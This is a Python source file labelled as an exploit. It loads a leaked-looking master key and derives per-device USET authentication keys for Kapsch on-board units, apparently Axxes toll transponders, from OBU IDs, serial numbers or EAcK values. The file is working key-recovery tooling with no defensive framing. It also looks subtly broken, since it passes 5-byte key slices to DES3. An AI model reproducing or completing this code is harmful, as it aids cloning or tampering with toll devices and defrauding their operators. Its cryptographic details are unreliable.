from Crypto.Cipher import DES3

# EXPLOIT
with open('../security_info/axxes_kapsch_exploit_master_uset_key_hex_v1.0.txt', 'r') as txt_file:
    axxes_kapsch_exploit_master_uset_key_hex = txt_file.read()
    axxes_kapsch_exploit_master_uset_key_bytes = bytes.fromhex(axxes_kapsch_exploit_master_uset_key_hex)

    axxes_uset_cipher_part1 = DES3.new(axxes_kapsch_exploit_master_uset_key_bytes[0:5], DES3.MODE_ECB)
    axxes_uset_cipher_part2 = DES3.new(axxes_kapsch_exploit_master_uset_key_bytes[5:10], DES3.MODE_ECB)
    del axxes_kapsch_exploit_master_uset_key_bytes
    del axxes_kapsch_exploit_master_uset_key_hex

def get_kapsch_ac_cr_keyref_from_obu_id(eq_obu_id_bytes:bytes) -> int:
    # AC_CR-KeyRef is two bytes (0x00 + OBU ID's least significant byte) = OBU ID modulo 256
    return eq_obu_id_bytes[0]

def get_kapsch_ac_cr_keyref_from_serial_number(serial_number:str) -> int:
    obu_id_str = serial_number[4:14]
    obu_id_bytes = int(obu_id_str, 10).to_bytes(4)
    return get_kapsch_ac_cr_keyref_from_obu_id(obu_id_bytes)

def get_uset_exploit_derived_key_bytes(ac_cr_keyref:int) -> bytes:
    # USET Key = 3DES(Master USET Key Part 1, AC_CR-KeyRef || AC_CR-KeyRef || AC_CR-KeyRef || AC_CRKeyRef) || 3DES(Master USET Key Part 2, AC_CR-KeyRef || AC_CR-KeyRef || AC_CR-KeyRef || AC_CRKeyRef)
    plaintext_bytes = ac_cr_keyref.to_bytes(4) * 4

    ciphertext_bytes_part1 = axxes_uset_cipher_part1.encrypt(plaintext_bytes)
    ciphertext_bytes_part2 = axxes_uset_cipher_part2.encrypt(plaintext_bytes)

    uset_key = ciphertext_bytes_part1 + ciphertext_bytes_part2
    return uset_key

def get_uset_exploit_derived_key_bytes_from_eack(eack_bytes) -> bytes:
    # USET = EAcK || EAcK
    return eack_bytes * 2

def get_uset_exploit_derived_key_bytes_from_obu_id(eq_obu_id_bytes:bytes) -> bytes:
    ac_cr_keyref = get_kapsch_ac_cr_keyref_from_obu_id(eq_obu_id_bytes)
    return get_uset_exploit_derived_key_bytes(ac_cr_keyref)

def get_uset_exploit_derived_key_bytes_from_serial_number(serial_number:str) -> bytes:
    ac_cr_keyref = get_kapsch_ac_cr_keyref_from_serial_number(serial_number)
    return get_uset_exploit_derived_key_bytes(ac_cr_keyref)

# TRANSPORT

# STOCK